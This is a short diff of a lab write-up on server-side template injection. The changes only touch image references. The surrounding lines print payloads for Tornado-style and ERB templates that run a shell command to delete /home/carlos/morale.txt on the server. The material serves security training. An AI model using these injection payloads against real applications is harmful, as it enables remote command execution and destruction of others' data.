@@ -37,16 +37,12 @@ its written in the code as ``{{ user.frist_name }}``
 4- to remove the file .txt, so the final payload will be `user.first_name}}{%import+os%}{{os.system('rm+/home/carlos/morale.txt')`
 
 <p align="center" width="100%">
-  <img src="image2.png" width="800" hight="500"/>
+  <img src="image3.png" width="800" hight="500"/>
 </p>
 
 To Solve the lab, we will change the command to delete file
 
 `<%= system('rm /home/carlos/morale.txt') %>`
-
-<p align="center" width="100%">
-  <img src="image3.png" width="800" hight="500"/>
-</p>
 
 <p align="center" width="100%">
   <img src="image4.png" width="800" hight="500"/>
